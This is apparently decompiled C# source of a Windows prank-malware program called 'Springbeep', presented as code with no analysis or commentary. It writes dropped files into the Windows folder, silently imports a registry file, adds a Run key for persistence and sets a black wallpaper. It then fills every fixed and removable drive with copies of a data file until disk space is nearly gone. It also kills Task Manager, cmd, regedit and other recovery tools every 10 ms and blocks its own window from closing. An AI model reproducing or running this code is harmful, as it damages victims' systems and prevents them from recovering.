using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using Springbeep.Properties;

namespace Springbeep;

public class Form1 : Form
{
	private string[] Killproes = new string[6] { "cmd.exe", "taskkill.exe", "ntsd.exe", "regedit.exe", "mmc.exe", "taskmgr.exe" };

	private IContainer components;

	private Label label1;

	private Process process1;

	private Timer timer1;

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("shell32.dll")]
	public static extern void SHChangeNotify(uint wEventId, uint uFlags, IntPtr dwItem1, IntPtr dwItem2);

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		((CancelEventArgs)(object)e).Cancel = true;
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		if (Directory.Exists(Path.GetTempPath() + "\\HighSpeedCopy"))
		{
			try
			{
				File.Move(Path.GetTempPath() + "\\HighSpeedCopy\\winload.bin", Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\winload.bin");
				Directory.Delete(Path.GetTempPath() + "\\HighSpeedCopy", recursive: true);
			}
			catch
			{
			}
		}
		new Thread(Mainwork).Start();
	}

	private void Mainwork()
	{
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\winload.hlp", Resources.winload);
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\sbeicon.ico", Resources.sbeicon);
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\sbpicon.ico", Resources.sbpicon);
		File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\blackwall.bmp", Resources.blackwall);
		process1.Start();
		process1.WaitForExit(5000);
		RegistryKey localMachine = Registry.LocalMachine;
		localMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("SpringBeep", "\"" + Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\cmdtool.exe\" /Autorun", RegistryValueKind.String);
		localMachine.Close();
		SystemParametersInfo(20, 1, Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\blackwall.bmp", 1);
		SHChangeNotify(134217728u, 0u, IntPtr.Zero, IntPtr.Zero);
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if ((driveInfo.DriveType != DriveType.Fixed && driveInfo.DriveType != DriveType.Removable) || !Directory.Exists(driveInfo.Name))
			{
				continue;
			}
			int num = 1;
			while (driveInfo.TotalFreeSpace > 536870912L)
			{
				if (!File.Exists(driveInfo.Name + "Data" + num + ".bin"))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\winload.bin", driveInfo.Name + "Data" + num + ".bin");
				}
				num++;
			}
		}
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		Process[] processes = Process.GetProcesses();
		foreach (Process process in processes)
		{
			bool flag = false;
			string[] killproes = Killproes;
			foreach (string path in killproes)
			{
				if (process.ProcessName.ToUpper() == Path.GetFileNameWithoutExtension(path)!.ToUpper())
				{
					flag = true;
				}
			}
			if (flag)
			{
				process.Kill();
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0230: Unknown result type (might be due to invalid IL or missing references)
		//IL_023a: Expected O, but got Unknown
		components = new Container();
		label1 = new Label();
		process1 = new Process();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(101, 12));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(155, 12));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("This is a very bad world.");
		process1.StartInfo.Arguments = "import winload.hlp";
		process1.StartInfo.Domain = "";
		process1.StartInfo.FileName = "reg.exe";
		process1.StartInfo.LoadUserProfile = false;
		process1.StartInfo.Password = null;
		process1.StartInfo.StandardErrorEncoding = null;
		process1.StartInfo.StandardOutputEncoding = null;
		process1.StartInfo.UserName = "";
		process1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process1.SynchronizingObject = (ISynchronizeInvoke?)this;
		timer1.set_Enabled(true);
		timer1.set_Interval(10);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Form)this).set_ClientSize(new Size(356, 31));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Springbeep 1.0");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
